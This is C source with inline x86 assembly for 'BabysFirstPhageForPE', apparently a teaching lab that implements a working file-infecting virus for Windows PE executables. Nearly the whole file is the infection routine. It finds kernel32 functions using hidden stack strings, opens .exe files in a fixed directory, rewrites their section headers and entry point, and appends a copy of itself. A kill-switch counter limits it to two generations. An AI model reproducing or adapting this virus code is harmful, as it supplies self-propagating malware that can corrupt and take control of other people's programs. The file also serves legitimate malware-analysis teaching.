//WARNING WARNING WARNING WARNING WARNING WARNING WARNING 
//WARNING WARNING WARNING WARNING WARNING WARNING WARNING 
//DO NOT run the executable generated by this code on a 
//system that you care about. This code has bugs and will
//almost certainly mess up executables. It should only be
//run on test VMs. If you break stuff, it's your problem.
//WARNING WARNING WARNING WARNING WARNING WARNING WARNING 
//WARNING WARNING WARNING WARNING WARNING WARNING WARNING 


//BabysFirstPhageForPE.c: A super simple program to start a viral infection
//The children of this process will be able to infect grandchildren, but
//the grandchildren will be sterile and unable to infect further binaries
//Written by Xeno Kovah, Nov 2010
//Originally for use with MITRE Institute Life of Binaries class
//Licensed under Creative Commons Share Alike license.
//full details available here: http://creativecommons.org/licenses/by-sa/3.0
//P.s. Don't comment on the efficiency or style or lack of error checking in the code, 
//it's slapdash tutorial code without any pride of codership! :P

#include <Windows.h>
#include <stdio.h>
//Create typedefs for the function pointers that I'm going to use

//added - GetModuleHandleA to get base address of current process
typedef HMODULE(__stdcall *FunPtr_GetModuleHandleA)(LPCTSTR);

typedef BOOL(__stdcall *FunPtr_SetCurrentDirectoryA)(LPCSTR);
typedef HANDLE(__stdcall *FunPtr_FindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL(__stdcall *FunPtr_FindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
typedef HANDLE(__stdcall *FunPtr_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(__stdcall *FunPtr_ReadFileA)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(__stdcall *FunPtr_WriteFileA)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(__stdcall *FunPtr_CloseHandle)(HANDLE);
typedef DWORD(__stdcall *FunPtr_SetFilePointer)(HANDLE, LONG, PLONG, DWORD);

//Macro to round up to the nearest 0x1000 if it's not already 0x1000 rounded
#define PAGE_ALIGN_UP(x)	((x + 0xFFF) & 0xFFFFF000)

//The __declspec( naked ) just means don't generate the normal stack frame
//or other auto-compiler-generated prolog/epilog instructions

//KillSwitchCounter will be placed here in order to be used as a kill switch
//The value in this byte is incremented on each subsequent infection
//and the virus reads it and if it's > 1, then the virus won't run

//OriginalEntryPoint will be set by BabysFirstPhageForPE's main() or 
//by one virus before it injects the copy of itself into the next binary

//I'm making
__declspec(naked) void specialData() {
	__asm {_emit 0x00}; //This is KillSwitchCounter
	__asm {_emit 0x00};
	__asm {_emit 0x00};
	__asm {_emit 0x00};
	__asm {_emit 0x00}; //This is where a copy of OriginalEntryPoint is stored
	__asm {_emit 0x00};
	__asm {_emit 0x00};
	__asm {_emit 0x00};
}

//Modified from Skape/Matt Miller's excellent win32 shellcode tutorial
//which you should consult for the exact meaning of the sequence
//http://www.hick.org/code/skape/papers/win32-shellcode.pdf
//This will also help:
//http://www.openrce.org/reference_library/files/reference/Windows%20Memory%20Layout,%20User-Kernel%20Address%20Spaces.pdf
__declspec(naked)unsigned int FindKernel32() {
	__asm {
		push esi;
		mov eax, fs:[0x30];
		mov eax, [eax + 0xC];
		mov esi, [eax + 0x1C];
		lodsd; //like "mov eax, ds:[esi]", was presumably originally chosen for small code size optimization
		mov eax, [eax + 0x8];
		pop esi;
		ret;
	};
}

unsigned int findBaseFunction(unsigned int kernel32BaseAddr, PIMAGE_EXPORT_DIRECTORY exportDirPtr, const char* functionToFind) {
	unsigned int numberOfNames = exportDirPtr->NumberOfNames;
	unsigned int* namesAddresses = kernel32BaseAddr + exportDirPtr->AddressOfNames;

	int i = 0;
	for (i = 0; i < numberOfNames; i++) {
		char* currentName = kernel32BaseAddr + *(namesAddresses + i);

		//use repne scabsb to as strlen()
		__asm {
			sub	ecx, ecx;
			mov	edi, currentName;
			not ecx;
			sub	al, al;
			cld;
			repne scasb;
			not ecx;
			lea	eax, [ecx - 1]
		}

		/*
		if (strcmp(currentName, functionToFind) == 0) {
		break;
		}
		*/

		//compare strings with repe cmpsb
		__asm {
			cld;
			mov ecx, eax;
			mov edi, functionToFind;
			mov esi, currentName;
			repe cmpsb;
			jne mismatch;
		}

		//we found the function!
		break;

	mismatch:
		__asm {
			NOP;
		}
	}

	if (i == numberOfNames)
		return 0;

	unsigned short* ordinalAddress = kernel32BaseAddr + exportDirPtr->AddressOfNameOrdinals;
	unsigned short offset = ordinalAddress[i];
	unsigned int* multiUseIntPtr = kernel32BaseAddr + exportDirPtr->AddressOfFunctions;
	unsigned int currentBaseAddress = kernel32BaseAddr + *(multiUseIntPtr + offset);
	return currentBaseAddress;
}

//The below is the main code which gets written into the infected file
void InjectMe() {
	char buffer[0x1000];
	PIMAGE_NT_HEADERS ntHdrPtr;
	PIMAGE_SECTION_HEADER sectionHdrPtr;
	PIMAGE_EXPORT_DIRECTORY exportDirPtr;
	unsigned int kernel32BaseAddr;
	FunPtr_FindFirstFileA MyFindFirstFileA; //For finding files in a directory
	FunPtr_FindNextFileA MyFindNextFileA; //For finding files in a directory
	FunPtr_CreateFileA MyCreateFileA;//for opening a file
	FunPtr_ReadFileA MyReadFileA;//For reading the file-to-be-infected's headers
	FunPtr_WriteFileA MyWriteFileA;//for writing the virus code to the file
	FunPtr_SetCurrentDirectoryA MySetCurrentDirectoryA;//To change where the code is searching for files
	FunPtr_CloseHandle MyCloseHandle; //Closes a handle returned by MyFindFirstFileA or MyCreateFileA
	FunPtr_SetFilePointer MySetFilePointer; //For setting to the end of the file before appending
	HANDLE handyTheHelpfulHandle;
	HANDLE harveyTheHurtfulHandle;
	WIN32_FIND_DATA dataAndJunk;
	unsigned int * multiUseIntPtr;
	unsigned int multiUseInt;
	unsigned int copyOfOriginalEntryPointRVA;
	unsigned int * specialDataDynamicallyCalculatedAddress;
	unsigned int fileOpenFailureCount;

	//The first thing we need to do is calculate the address of our specialData
	//since if we just use casting of its name, we get absolute addresses in
	//the asm instructions, which won't work once the virus is injected into
	//another process. So we will start by calculating where the code is currently
	//running, and then subtracting a value hardcoded from that, which represents
	//the number of bytes between our current location and the start of specialData

	__asm {
		//Since I don't know how to get the assembler to generate the "call next instruction" 
		//aka "call 0" form, I have to manually hardcode the bytes for it
		//Note: there's only a 4 byte operand version for the *relative* call form
		_emit 0xE8;
		_emit 0x00;
		_emit 0x00;
		_emit 0x00;
		_emit 0x00;
		pop eax; //Basically getting the eip of this instruction (which was pushed by the call) into eax
		sub eax, 0x101; //Subtracting the fixed size which we know is inbetween the special data and the previous instruction
		mov specialDataDynamicallyCalculatedAddress, eax; //Put the address into a C variable for ease of use
	}


	//Check if this virus should even run. If the KillSwitchCounter is > 1, then don't
	//execute any of the rest of the virus code

	if (specialDataDynamicallyCalculatedAddress[0] > 1) {
		//Set eax = 0 to indicate we got to callOriginalEntryPoint through a failure path
		//the success or failure really only matters for BabysFirstPhage, and won't matter
		//when the actual virus is running.
		__asm { xor eax, eax }; //indicate failure path
		goto callOriginalEntryPoint; //exit the virus and just go to the original
	}

	//Find the base address of kernel32.dll, since it should generally be in most
	//applications, and we will only use functions from it in the virus code.
	//Note: if it's not loaded into the memory space, then the below code
	//will get messed up very fast and something will go boom.
	kernel32BaseAddr = FindKernel32();

	//Find the RVAs for the exported functions that I need
	//NOTE: I'm cheating to get this done faster, I'm assuming that
	//the functions will be at the ordinals that I found them at on
	//my system. In practice the code should compare against the
	//string name or a hash of the string name (the hashing technique
	//is also given in the Skape shellcode paper)
	ntHdrPtr = (PIMAGE_NT_HEADERS)(kernel32BaseAddr + ((PIMAGE_DOS_HEADER)kernel32BaseAddr)->e_lfanew);
	exportDirPtr = (PIMAGE_EXPORT_DIRECTORY)(kernel32BaseAddr + ntHdrPtr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	multiUseIntPtr = (unsigned int *)(kernel32BaseAddr + exportDirPtr->AddressOfFunctions);
	/*
	MyCloseHandle = (FunPtr_CloseHandle)(kernel32BaseAddr + multiUseIntPtr[0x54]);
	MyCreateFileA = (FunPtr_CreateFileA)(kernel32BaseAddr + multiUseIntPtr[0x8A]);
	MyFindFirstFileA = (FunPtr_FindFirstFileA)(kernel32BaseAddr + multiUseIntPtr[0x134]);
	MyFindNextFileA = (FunPtr_FindNextFileA)(kernel32BaseAddr + multiUseIntPtr[0x145]);
	MyReadFileA = (FunPtr_ReadFileA)(kernel32BaseAddr + multiUseIntPtr[0x3C0]);
	MySetCurrentDirectoryA = (FunPtr_SetCurrentDirectoryA)(kernel32BaseAddr + multiUseIntPtr[0x44C]);
	MySetFilePointer = (FunPtr_SetFilePointer)(kernel32BaseAddr + multiUseIntPtr[0x465]);
	MyWriteFileA = (FunPtr_WriteFileA)(kernel32BaseAddr + multiUseIntPtr[0x526]);
	*/

	//breaks if we do not intialize a char* on the stack! :( If called like below, "CloseHandle" gets intialized somewhere 
	//as a constant char* global in our first program
	//but not copied to the infected file!!!
	//MyCloseHandle = (FunPtr_CloseHandle)findBaseFunction(kernel32BaseAddr, exportDirPtr, "CloseHandle");
	/*
	char* closeHandleString = "CloseHandle";
	char* createFileAString = "CreateFileA";
	char* findFirstFileAString = "FindFirstFileA";
	char* findNextFileAString = "FindNextFileA";
	char* readFileString = "ReadFile";
	char* setCurrentDirectoryAString = "SetCurrentDirectoryA";
	char* setFilePointerString = "SetFilePointer";
	char* writeFileString = "WriteFile";
	*/
	char* functionString;
	//copy a string to function string by using the stack.
	__asm {
		//Closehandle
		//43 6c 6f 73 65 48 61 6e 64 6c 65
		push 0x00656c64; //NULL e l d
		push 0x6e614865; //n a H e
		push 0x736f6c43; //s o l C
		mov functionString, esp;
	}

	MyCloseHandle = (FunPtr_CloseHandle)findBaseFunction(kernel32BaseAddr, exportDirPtr, functionString);

	__asm {
		add esp, 0xC; //remove the string by clearing the stack
					  //CreateFileA
					  //43 72 65 61 74 65 46 69 6c 65 41
		push 0x0041656c; //NULL A e l
		push 0x69466574; //i F e t
		push 0x61657243; //a e r C
		mov functionString, esp;
	}

	MyCreateFileA = (FunPtr_CreateFileA)findBaseFunction(kernel32BaseAddr, exportDirPtr, functionString);

	__asm {
		add esp, 0xC; //remove the string by clearing the stack
					  //FindFirstFileA
					  //46 69 6e 64 46 69 72 73 74 46 69 6c 65 41
		push 0x00004165; //NULL NULL A e
		push 0x6c694674; //l i F t
		push 0x73726946; //s r i F
		push 0x646e6946; //d i n F
		mov functionString, esp;
	}

	MyFindFirstFileA = (FunPtr_FindFirstFileA)findBaseFunction(kernel32BaseAddr, exportDirPtr, functionString);

	__asm {
		add esp, 0x10; //remove the string by clearing the stack
					   //FindNextFileA
					   //46 69 6e 64 4e 65 78 74 46 69 6c 65 41
		push 0x00000041; //NULL NULL NULL A
		push 0x656c6946; //e l i f
		push 0x7478654e; //t x e n
		push 0x646e6946; //d i n F
		mov functionString, esp;
	}

	MyFindNextFileA = (FunPtr_FindNextFileA)findBaseFunction(kernel32BaseAddr, exportDirPtr, functionString);

	__asm {
		add esp, 0x10; //remove the string by clearing the stack
					   //ReadFile
					   //52 65 61 64 46 69 6c 65
		push 0x00000000; //NULL NULL NULL NULL
		push 0x656c6946; //e l i F
		push 0x64616552; //d a e R
		mov functionString, esp;
	}

	MyReadFileA = (FunPtr_ReadFileA)findBaseFunction(kernel32BaseAddr, exportDirPtr, functionString);

	__asm {
		add esp, 0xC; //remove the string by clearing the stack
					  //SetCurrentDirectoryA
					  //53 65 74 43 75 72 72 65 6e 74 44 69 72 65 63 74 6f 72 79 41
		push 0x00000000; //NULL NULL NULL NULL
		push 0x4179726f; //A y r o
		push 0x74636572; //t c e r
		push 0x6944746e; //i D t n
		push 0x65727275; //e r r u
		push 0x43746553; //C t e S
		mov functionString, esp;
	}

	MySetCurrentDirectoryA = (FunPtr_SetCurrentDirectoryA)findBaseFunction(kernel32BaseAddr, exportDirPtr, functionString);

	__asm {
		add esp, 0x18; //remove the string by clearing the stack
					   //SetFilePointer
					   //53 65 74 46 69 6c 65 50 6f 69 6e 74 65 72
		push 0x00007265; //NULL r e t
		push 0x746e696f; //n i o P
		push 0x50656c69; //P e l i
		push 0x46746553; //F t e S
		mov functionString, esp;
	}

	MySetFilePointer = (FunPtr_SetFilePointer)findBaseFunction(kernel32BaseAddr, exportDirPtr, functionString);

	__asm {
		add esp, 0x10; //remove the string by clearing the stack
					   //WriteFile
					   //57 72 69 74 65 46 69 6c 65
		push 0x00000065; //NULL NULL NULL e
		push 0x6c694665; //l i F e
		push 0x74697257; //t i r W
		mov functionString, esp;
	}

	MyWriteFileA = (FunPtr_WriteFileA)findBaseFunction(kernel32BaseAddr, exportDirPtr, functionString);

	__asm {
		add esp, 0xC; //remove the string by clearing the stack
	}

	//Now that we have the function pointers we need, we can open other files to infect

	//Now I'm going to push the string onto the stack and pass a pointer to it on the stack
	//and therefore I won't have to deal with placing the string elsewhere and finding it
	//Borrowed this trick from Corey Kallenberg's description of a virus he wrote once
	__asm {
		//trying to push "C:\\VirusTarget\\" which is the only directory where executable
		//can be infected
		push 0x0000005C;// NULL NULL NULL \ = big endian value which will be stored in memory little endian as \NULLNULLNULL
		push 0x5C746567;// \ t e g = big endian value which will be stored in memory little endian as get\ 
		push 0x72615473;// r a T s = big endian value which will be stored in memory little endian as sTar 
		push 0x75726956;// u r i V = big endian value which will be stored in memory little endian as Viru 
		push 0x5C5C3A43;// \ \ : C = big endian value which will be stored in memory little endian as C:\\  
		push esp;		//Points at the string which is now on the stack
		call MySetCurrentDirectoryA;
		mov multiUseInt, eax; //store the return value
		add esp, 0x14;	//remove the string from the stack, SetCurrentDirectoryA is stdcall calling convention 
						//so it gets rid of the 1 parameter on the stack as it returns
	};
	if (multiUseInt == 0) {
		__asm { xor eax, eax }; //indicate failure path
		goto callOriginalEntryPoint; //exit the virus and just go to the original
	}

	//Same thing to push the string "*.exe" to specify the files to search for. Equivalent is:
	//handyTheHelpfulHandle = FindFirstFile("*.exe", &dataAndJunk);
	__asm {
		push 0x00000065;// NULL NULL NULL e = big endian value which will be stored in memory little endian as e NULL NULL NULL
		push 0x78652E2A;// x e . * = big endian value which will be stored in memory little endian as *.ex
		lea eax, dataAndJunk;
		push eax; //&dataAndJunk, 2nd parameter
		lea eax, [esp + 4]; //To skip past the send parameter and point at the string on the stack
		push eax; //address of "*.exe" string, 1st parameter
		call MyFindFirstFileA;
		mov handyTheHelpfulHandle, eax; //put the return handle into the variable
		add esp, 0x8; //remove the string from the stack, FindFirstFileA is stdcall calling convention 
					  //so it gets rid of the 2 parameters on the stack as it returns
	}
	if (handyTheHelpfulHandle == INVALID_HANDLE_VALUE) {
		__asm { xor eax, eax }; //indicate failure path
		goto callOriginalEntryPoint; //exit the virus and just go to the original
	}

	//Keep looping looking for a file to infect until we succeed or fail
	fileOpenFailureCount = 0;
	while (1) {

		//Check if it's a regular file, if not, skip it
		if (dataAndJunk.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			if (!MyFindNextFileA(handyTheHelpfulHandle, &dataAndJunk)) {
				__asm { xor eax, eax }; //indicate failure path
				goto callOriginalEntryPoint; //exit the virus and just go to the original
			}
			continue;
		}

		//Open the existing file...with CreateFile...I know, I know...sigh
		harveyTheHurtfulHandle = MyCreateFileA(dataAndJunk.cFileName, (GENERIC_READ | GENERIC_WRITE), (FILE_SHARE_READ | FILE_SHARE_WRITE), NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (harveyTheHurtfulHandle == INVALID_HANDLE_VALUE) {
			fileOpenFailureCount++;
			if (fileOpenFailureCount > 5 || !MyFindNextFileA(handyTheHelpfulHandle, &dataAndJunk)) {
				__asm { xor eax, eax }; //indicate failure path
				goto callOriginalEntryPoint; //exit the virus and just go to the original
			}
			else {
				continue;
			}
		}

		//Read the headers for the file
		//on error it returns false
		if (!MyReadFileA(harveyTheHurtfulHandle, &buffer, 0x1000, &multiUseInt, NULL)) {
			MyCloseHandle(harveyTheHurtfulHandle);
			MyCloseHandle(handyTheHelpfulHandle);
			__asm { xor eax, eax }; //indicate failure path
			goto callOriginalEntryPoint; //exit the virus and just go to the original
		}

		//Check if it doesn't even have a DOS header, skip it
		if (((PIMAGE_DOS_HEADER)buffer)->e_magic != IMAGE_DOS_SIGNATURE) {
			MyCloseHandle(harveyTheHurtfulHandle);
			if (!MyFindNextFileA(handyTheHelpfulHandle, &dataAndJunk)) {
				__asm { xor eax, eax }; //indicate failure path
				goto callOriginalEntryPoint; //exit the virus and just go to the original
			}
			continue;
		}

		//Check for the magic "I'm infected" value, if so, skip to next file
		if (((PIMAGE_DOS_HEADER)buffer)->e_res[0] == 0xf001) {
			MyCloseHandle(harveyTheHurtfulHandle);
			if (!MyFindNextFileA(handyTheHelpfulHandle, &dataAndJunk)) {
				__asm { xor eax, eax }; //indicate failure path
				goto callOriginalEntryPoint; //exit the virus and just go to the original
			}
			continue;
		}

		//Get the NT header for the file which was just read in
		ntHdrPtr = (PIMAGE_NT_HEADERS)((unsigned char *)&buffer + ((PIMAGE_DOS_HEADER)buffer)->e_lfanew);

		//A quick couple sanity checks to make sure we have a PE header and
		//that the file is executable.
		if (ntHdrPtr->Signature != IMAGE_NT_SIGNATURE ||
			((ntHdrPtr->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE) == 0))
		{
			MyCloseHandle(harveyTheHurtfulHandle);
			MyCloseHandle(handyTheHelpfulHandle);
			__asm { xor eax, eax }; //indicate failure path
			goto callOriginalEntryPoint; //exit the virus and just go to the original
		}

		//If we've got this far we're pretty much in the clear. Time to start changing the
		//copies of the headers for the file we want to infect, before writing those
		//headers back to the file

		//Set the magic "this binary is infected" value
		((PIMAGE_DOS_HEADER)buffer)->e_res[0] = 0xf001;

		//Find the last section headed and modify it to allocate space for the virus
		//Recall that the section headers come immediately after the NT header
		//So if there are 5 section headers, we want the one with index 4
		sectionHdrPtr = (PIMAGE_SECTION_HEADER)((unsigned int)ntHdrPtr + sizeof(IMAGE_NT_HEADERS) + (ntHdrPtr->FileHeader.NumberOfSections - 1) * sizeof(IMAGE_SECTION_HEADER));
		//Check if the last section is marked as discardable. If so, toggle that off
		if (sectionHdrPtr->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) {
			sectionHdrPtr->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
		}
		//And either way make sure that the section is readable/writable/executable
		copyOfOriginalEntryPointRVA = sectionHdrPtr->Characteristics |= (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE);

		//Make a copy of the original entry point (OEP), so that the virus can eventually call it
		//But we want it as an absolute virtual address rather than relative, so add in the base
		//NOTE: this works because we're only infecting exe files, not DLLs. For exes, they will
		//always be loaded at their preferred base address (not so with DLLs or kernel drivers)


		//copyOfOriginalEntryPointRVA = ntHdrPtr->OptionalHeader.ImageBase + ntHdrPtr->OptionalHeader.AddressOfEntryPoint;

		copyOfOriginalEntryPointRVA = ntHdrPtr->OptionalHeader.AddressOfEntryPoint;

		//Modify the entry point to point to the start of the virus, which will be
		//where the uninfected file would have stopped + the offset to InjectMe() (which is currently 0xF0, 
		//due to padding after the two specialData* functions)
		ntHdrPtr->OptionalHeader.AddressOfEntryPoint = sectionHdrPtr->VirtualAddress + sectionHdrPtr->SizeOfRawData + 0xF0;

		FunPtr_GetModuleHandleA MyGetModuleHandleA;
		__asm {
			//GetModuleHandleA
			//47 65 74 4d 6f 64 75 6c 65 48 61 6e 64 6c 65 41
			push 0x00000000; //null
			push 0x41656c64; //a e l d
			push 0x6e614865; //n a H e
			push 0x6c75646f; //l u d o
			push 0x4d746547; //M t e G
			mov functionString, esp;
		}
		//Here is another way to get the base address of the current process.
		MyGetModuleHandleA = (FunPtr_GetModuleHandleA)findBaseFunction(kernel32BaseAddr, exportDirPtr, functionString);

		__asm {
			add esp, 0x14; //remove the string by clearing the stack
		}

		unsigned int base;

		__asm {

			push 0; //use null as an arg because we are finding the address of the current process
			call MyGetModuleHandleA; //call GetModuleHandleA to get the base address of this process
			mov base, eax; //move the base address into
		}

		PIMAGE_DOS_HEADER dosHdrPtrToCurrentProcess = (PIMAGE_DOS_HEADER)base;
		PIMAGE_NT_HEADERS ntHdrPtrToCurrentProcess = (PIMAGE_NT_HEADERS)(base + dosHdrPtrToCurrentProcess->e_lfanew);
		//int result = VirtualProtect(base, 0x1000, PAGE_EXECUTE_READWRITE, NULL);
		//((PIMAGE_DOS_HEADER)base)->e_res[0] = 0x0001;
		//ntHdrPtrToCurrentProcess->OptionalHeader.AddressOfEntryPoint = specialDataDynamicallyCalculatedAddress[1];
		//copyOfOriginalEntryPointRVA = base + ntHdrPtrToOtherProcess->OptionalHeader.AddressOfEntryPoint;

		//Now add the actual space to the header
		//Using 0x1000 for the size of data we want to add just for simplicity
		sectionHdrPtr->SizeOfRawData += 0x1000;
		sectionHdrPtr->Misc.VirtualSize += 0x1000;

		//Also need to update the total virtual size of the image
		ntHdrPtr->OptionalHeader.SizeOfImage = PAGE_ALIGN_UP(sectionHdrPtr->VirtualAddress + sectionHdrPtr->Misc.VirtualSize);

		//Fix the ntHdrPtr->OptionalHeader.CheckSum here if you want infected binaries
		//to run without manual fixup

		//Set the file pointer back to the beginning of the file
		if (INVALID_SET_FILE_POINTER == MySetFilePointer(harveyTheHurtfulHandle, 0, NULL, FILE_BEGIN)) {
			__asm { xor eax, eax }; //indicate failure path
			goto callOriginalEntryPoint; //exit the virus and just go to the original
		}

		//Write the modified headers back to the file
		if (!MyWriteFileA(harveyTheHurtfulHandle, &buffer, 0x1000, &multiUseInt, NULL)) {
			MyCloseHandle(harveyTheHurtfulHandle);
			MyCloseHandle(handyTheHelpfulHandle);
			__asm { xor eax, eax }; //indicate failure path
			goto callOriginalEntryPoint; //exit the virus and just go to the original
		}

		//Now zero out the buffer and put a copy of the virus in it
		//Using the rep stos instruction as a memset like we learned in the Intro x86 class
		__asm {
			xor eax, eax;	//going to write 4 bytes of 0 at a time
			mov ecx, 0x400; //0x400 * 4 bytes at a time = 0x1000 bytes total written
			lea edi, buffer;//Since buffer is an array, we want the address where it starts
			rep stos dword ptr es : [edi];//If you don't put the "dword ptr" it generates the "byte ptr" form!
		}

		//Using the rep movs instruction as a memcpy like we learned in the Intro x86 class
		//But we're only going to copy the 4-byte-rounded-up size of the actual code into
		//the buffer. So while all 0x1000 will be written to the file, the real code will
		//just be at the beginning
		__asm {
			mov ecx, 0x250;	//we're going to copy 0x161 * 4 = 0x584 bytes (the approx size of the actual virus data & code)
			lea edi, buffer;//Since buffer is an array, we want the address where it starts
			mov esi, specialDataDynamicallyCalculatedAddress; //Where the special data preceeding the virus code starts
			rep movs dword ptr es : [edi], ds : [esi]; //If you don't put the "dword ptr" it generates the "byte ptr" form!
		}

		//Set the original entry point to the copy which we made
		//recall that the data will be stored as the second DWORD worth of data in the buffer
		//Are you digging my magic casting skills yet? :P
		((unsigned int *)buffer)[1] = copyOfOriginalEntryPointRVA;

		//Set kill switch count for the next virus to be that of the current virus + 1
		//This way BabysFirstPhageForPE can infect multiple files, and each of those files
		//can infect one more file, but those viruses are inert because they will have
		//KillSwitchCount > 1, and thus won't execute.
		((unsigned int *)buffer)[0] = (specialDataDynamicallyCalculatedAddress[0]) + 1;

		//Close the file and open it again in append mode
		MyCloseHandle(harveyTheHurtfulHandle);
		harveyTheHurtfulHandle = MyCreateFileA(dataAndJunk.cFileName, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (harveyTheHurtfulHandle == INVALID_HANDLE_VALUE) {
			__asm { xor eax, eax }; //indicate failure path
			goto callOriginalEntryPoint; //exit the virus and just go to the original
		}

		if (INVALID_SET_FILE_POINTER == MySetFilePointer(harveyTheHurtfulHandle, 0, NULL, FILE_END)) {
			__asm { xor eax, eax }; //indicate failure path
			goto callOriginalEntryPoint; //exit the virus and just go to the original
		}

		//Copy virus on to the end of the file
		//We will be copying more information than is strictly necessary, but we wanted
		//to add 0x1000 to the raw data/virtual sizes for simplicity 
		////overlap.Offset = 0xFFFFFFFF;
		////overlap.OffsetHigh = 0xFFFFFFFF;
		if (!MyWriteFileA(harveyTheHurtfulHandle, &buffer, 0x1000, &multiUseInt, NULL)) {
			MyCloseHandle(harveyTheHurtfulHandle);
			MyCloseHandle(handyTheHelpfulHandle);
			__asm { xor eax, eax }; //indicate failure path
			goto callOriginalEntryPoint; //exit the virus and just go to the original
		}

		//NOTE: ideally, to make it a little safer, on successfull infection of another binary, 
		//this virus would disable itself by replacing the OEP as the actual entry point. 
		//However I haven't been able to get the code for a file writing to its own binary to 
		//work, and I want to be done with this lab. So if anyone wants to figure that out 
		//for me I'd appreciate it and give you credit in the file :)

		//This code succeeded in infecting one other file, so now exit by calling the 
		//original entry point which was already set up for us by either BabysFirstPhageForPE
		//or the previous copy of the virus

		MyCloseHandle(harveyTheHurtfulHandle);
		//		MyCloseHandle(handyTheHelpfulHandle); //Why is this crashing it?

		//Set eax = 1 to indicate we got to callOriginalEntryPoint through a successful path
		//the success or failure really only matters for BabysFirstPhage, and won't matter
		//when the actual virus is running
		__asm { mov eax, 1 };

	callOriginalEntryPoint:
		multiUseInt = specialDataDynamicallyCalculatedAddress[1];

		//__asm{mov ecx, multiUseInt}; //Need to do this because we can't use any of the 
		//local variables from this stack frame after we 
		//issue the leave instruction to destroy this frame
		__asm {
			mov ecx, multiUseInt;
			add ecx, base;
		};

		__asm {
			leave;	//does "mov esp, ebp" and "pop ebp"
			jmp ecx;	//go back to the original code which should 
						//have been called on application start
		}
	}

	//We should never get here (but we still copy the compiler generated
	//function exit code which exists here)

}

//Not working: It isn't letting me modify myself while running :-/
//NOTE: ideally, to make it a little safer, on successfull infection of another binary, 
//this virus would disable itself by replacing the OEP as the actual entry point. 
//However I haven't been able to get the code for a file writing to its own binary to 
//work, and I want to be done with this lab. So if anyone wants to figure that out 
//for me I'd appreciate it and give you credit in the file :)
//Mostly just copied from PropertyFinder.cpp
//For those wondering why I'm not using ReadFile/WriteFile, see the previous comment :P
//void InnoculateSelf(){
//	char bigBuffer[0x1000];
//	FILE * tmpStream;
//	PIMAGE_DOS_HEADER dosHeader;
//	unsigned int bytesRead;
//
//	errno_t err = fopen_s(&tmpStream, "..\\Debug\\BabysFirstPhageForPE.exe","r+");
//	if(err != 0){
//		printf("InnoculateSelf: fopen_s errno = %d\n", errno);
//		return;
//	}
//
//	bytesRead = fread(bigBuffer, sizeof(char), sizeof(IMAGE_DOS_HEADER), tmpStream);
//	if(bytesRead != sizeof(IMAGE_DOS_HEADER)){
//		printf("InnoculateSelf: fread error\n");
//		return;
//	}
//	
//	dosHeader = (PIMAGE_DOS_HEADER)bigBuffer;
//	//Sanity checks are for suckers!
//	dosHeader->e_res[0] = 0xf001;
//
//	if(fwrite(bigBuffer, sizeof(char), sizeof(IMAGE_DOS_HEADER), tmpStream) != sizeof(IMAGE_DOS_HEADER)){
//		printf("InnoculateSelf: fwrite error\n");
//	}
//}

int main() {
	unsigned int * addr;
	unsigned int retValue;
	DWORD oldPermissions;

	//Need to make our specialData variables writable. When the normal virus is
	//accessing them, they should be writable, but the first run is a special case
	addr = (unsigned int *)specialData;
	//may as well set the entire page to read/write/execute, since this only has page
	//granularity anyway
	if (!VirtualProtect(addr, 0x1000, PAGE_EXECUTE_READWRITE, &oldPermissions)) {
		printf("VirtualProtect failed\n");
		__asm {int 3}; //hardcoded breakpoint, learned about in Intermediate x86
		return;
	}

	//Main now also needs to set a value for the "original entry point" which 
	//the virus will jump to when it's done, either on success or failure.
	//Normally this would be set by the virus code to tell the copy of itself 
	//where the file it is residing in would have originally called at the start.
	//But in this case since BabysFirstPhageForPE is running the infection routine
	//in a different way than it will be run the rest of the time, it needs to
	//set the value just to get it back out of the function when it's done so
	//we can see whether it succeeded or not.
	__asm {
		lea eax, [specialData + 4]; //This is the address of the special data
		lea ebx, returnToHere;	//This is where we want to return
		mov[eax], ebx;	//This is writing where we want to reutrn into the special data memory
	};

	//fill the address of where we want to return
	unsigned int base = GetModuleHandleA(NULL);
	__asm {
		lea eax, [specialData + 4];
		lea ebx, returnToHere;
		sub ebx, base;
		mov[eax], ebx;
	}

	//Run the code which performs the self-propagation
	InjectMe();

returnToHere:
	__asm { add esp, 4}; //Get rid of the return address which was pushed by the call to InjectMe()
	__asm { mov retValue, eax }; //store the return value to a C variable for convenience
	if (retValue == 0) {
		printf("Failed to infect a file\n");
		return 0;
	}
	else {
		printf("Successfully infected a file\n");
		return 1;
	}

}